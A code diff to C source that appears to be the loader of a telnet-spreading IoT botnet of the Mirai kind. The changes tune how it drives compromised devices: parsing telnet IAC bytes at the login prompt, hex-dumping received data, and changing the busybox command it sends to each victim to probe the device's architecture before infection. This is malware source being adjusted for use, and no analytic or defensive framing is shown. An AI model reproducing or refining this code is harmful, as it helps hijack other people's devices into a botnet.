@@ -16,6 +16,8 @@
 #include "headers/binary.h"
 #include "headers/util.h"
 
+#include <wchar.h> 
+
 struct server *server_create(uint8_t threads, uint8_t addr_len, ipv4_t *addrs, uint32_t max_open, char *wghip, port_t wghp, char *thip)
 {
     struct server *srv = calloc(1, sizeof (struct server));
@@ -227,6 +229,7 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
 
 #ifdef DEBUG
         printf("[FD%d] Established connection\n", ev->data.fd);
+        usleep(1000);
 #endif
         event.data.fd = conn->fd;
         event.events = EPOLLIN | EPOLLET;
@@ -262,7 +265,8 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
                 break;
             }
 #ifdef DEBUG
-            printf("TELIN: %.*s\n", ret, conn->rdbuf + conn->rdbuf_pos);
+//            printf("TELIN: %.*s\n", ret, conn->rdbuf + conn->rdbuf_pos);
+            hexDump("TELNET", conn->rdbuf + conn->rdbuf_pos, ret);
 #endif
             conn->rdbuf_pos += ret;
             conn->last_recv = time(NULL);
@@ -285,6 +289,13 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
                             conn->state_telnet = TELNET_USER_PROMPT;
                         break;
                     case TELNET_USER_PROMPT:
+                        #ifdef DEBUG
+                        printf("Waiting user prompt...\n");
+                        #endif
+                        printf("Leading: %02x\n", conn->rdbuf[0]);
+			if (conn->rdbuf[0] == 0xff){
+                          consumed = connection_consume_iacs(conn);
+                        }
                         consumed = connection_consume_login_prompt(conn);
                         if (consumed)
                         {
@@ -370,7 +381,7 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
                                 conn->state_telnet = TELNET_DETECT_ARCH;
                                 conn->timeout = 120;
                                 // DO NOT COMBINE THESE
-                                util_sockprintf(conn->fd, "/bin/busybox cat /bin/mcpctl\r\n");  // TODO: change to echo/something
+                                util_sockprintf(conn->fd, "/bin/busybox head -c 20 /bin/echo\r\n");  // TODO: change to echo/something
                                 util_sockprintf(conn->fd, TOKEN_QUERY "\r\n");
                             }
                             else
